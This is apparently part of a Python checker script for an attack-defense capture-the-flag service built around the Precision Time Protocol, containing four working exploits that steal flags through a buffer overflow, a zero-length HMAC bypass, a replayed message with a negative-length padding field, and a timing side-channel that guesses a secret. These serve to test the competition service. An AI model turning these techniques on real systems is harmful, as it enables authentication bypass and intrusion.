    task: ExploitCheckerTaskMessage,
    searcher: FlagSearcher,
    connection: HttpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    target_clock_id, target_port = decode_port_id(task.attack_info)
    target_cache_index = (target_clock_id + target_port) % 256

    cache_index = target_cache_index - 1
    clock_id, port = generate_port_id(range(cache_index, cache_index + 1))
    secret = generate_secret(64)

    await create_clock(connection, logger, clock_id, port, generate_timestamp(), True, secret, "hmac", b"")

    await inspect_clock(connection, logger, target_clock_id, target_port, secret, True) # Prepare cache
    await inspect_clock(connection, logger, clock_id, port, secret) # Trigger buffer overflow

    received_description = await inspect_clock(connection, logger, target_clock_id, target_port, "")
    received_flag = searcher.search_flag(received_description)
    
    logger.info(f"Received flag {received_flag}")
    return received_flag

@checker.exploit(2)
async def exploit_zerolength(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(message, "hmac", 0)

    [response] = await connection.transaction(message, GENERAL_PORT)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                received_flag = decode_flag(received_description, logger, True)
                logger.info(f"Received flag {received_flag}")

                return received_flag

@checker.exploit(3)
async def exploit_replay(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)

    # Spoof target port
    initial_message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, clock_id, port, 0)

    payload = initial_message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    tlv = initial_message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

    add_auth_tlv(initial_message, "hmac")

    [response] = await connection.transaction(initial_message, GENERAL_PORT, receive_raw=True)

    altered_request = bytearray(response).rstrip(b'\0')[:-4]

    tlv_get_message = struct.pack("!HhHH", ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT, 4, ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION, 0)
    tlv_pad_message = struct.pack("!Hh", ptp_protocol.lib.PTP_TLV_TYPE_PAD, -38) # Jump back to auth TLV
    altered_request += tlv_get_message + tlv_pad_message

    if (len(response) < len(altered_request)):
        raise MumbleException(f"Not enough TLV tailroom (got {len(response)} but expected at least {len(altered_request)} bytes)")
    
    altered_request += b'\0' * (len(response) - len(altered_request))

    [response] = await connection.transaction(altered_request, GENERAL_PORT, send_raw=True)

    if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
        raise MumbleException("Expected management message in response")
    
    if response.decoded.payload.management.action != ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE:
        raise MumbleException("Expected management response action")
    
    for tlv in response.get_tlvs():
        if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
            if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                received_flag = decode_flag(received_description, logger, True)
                logger.info(f"Received flag {received_flag}")
                
                return received_flag

@checker.exploit(4)
async def exploit_timing(
    task: ExploitCheckerTaskMessage,
    connection: UdpConnection,
    logger:LoggerAdapter
) -> typing.Optional[str]:
    if task.attack_info is None:
        raise MumbleException("No attack info")
    
    clock_id, port = decode_port_id(task.attack_info)
    local_clock_id, local_port = generate_port_id()

    message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, local_clock_id, local_port, 0)

    payload = message.get_payload()
    payload.management.target_port_id.clock_id = clock_id
    payload.management.target_port_id.port = port
    payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
    payload.management.starting_boundary_hops = 0
    payload.management.boundary_hops = 0

    for _ in range(6):
        # Measure execution time (start time / end time of previous char)
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME

        # Trigger auth TLV
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        # Auth TLV to measure
        add_auth_tlv(message, "plain", 16)

    # End time of last char
    tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
    tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME
    
    request, request_pointer = message.encode(connection.BUFFER_SIZE)
    request_size = len(request)
    message = ptp_message.from_pointer(request_pointer, request_size)

    secret = bytearray()

    async def guess_char(secret):
        durations = np.empty(len(string.digits))
        i_request = 0
        i_response = 0

        while i_request < len(string.digits):
            j = 0

            for tlv in message.get_tlvs():
                if i_request >= len(string.digits):
                    break

                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
                    continue

                character = string.digits[i_request].encode("ascii")
                finalize_auth_tlv(tlv, request_pointer, secret + character)

                if j >= 1:
                    i_request += 1
                
                j += 1

            request = pointer_to_bytes(request_pointer, request_size)
            [response] = await connection.transaction(request, GENERAL_PORT, send_raw=True)            

            if response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT:
                raise MumbleException("Expected management message")
            
            j = 0
            for tlv in response.get_tlvs():
                if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                    continue

                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                    received_description = pointer_to_bytes(tlv.payload.management.payload.user_description.data, tlv.payload.management.payload.user_description.length)
                    received_flag = decode_flag(received_description, logger, True)                    
                    return None, None, received_flag
                elif tlv.payload.management.id != ptp_protocol.lib.PTP_MANAGEMENT_ID_TIME:
                    continue

                # The first measurement is garbage (likely due to cache misses)
                if j >= 2:
                    durations[i_response] = tlv.payload.management.payload.time - last_time
                    i_response += 1

                if i_response >= len(string.digits):
                    break
                
                last_time = tlv.payload.management.payload.time
                j += 1

        # Optimization: filter out obvious outliers (required for CI)
        durations[durations > np.median(durations) + 10000] = 0

        guess = string.digits[np.argmax(durations)].encode("ascii")
        avg_duration = np.sum(durations) / np.count_nonzero(durations)

        return guess, avg_duration, None
    
    avg_durations = [-np.inf]

    # Likely not as many iterations needed, but I don't want the CI to randomly fail
    for i in range(1, 500):
        guess, avg_duration, received_flag = await guess_char(bytes(secret))

        if received_flag is not None:
            logger.info(f"Received flag {received_flag} after {i} iterations with median diff {np.median(np.diff(avg_durations)):.1f} ns")
            return received_flag
        
        # Backtracking if we made an error due to noise
        if avg_duration > avg_durations[-1] + 200:
            secret += guess
            avg_durations += [avg_duration]
        else:
            secret = secret[:-1]
            avg_durations = avg_durations[:-1]

if __name__ == "__main__":
    checker.run()
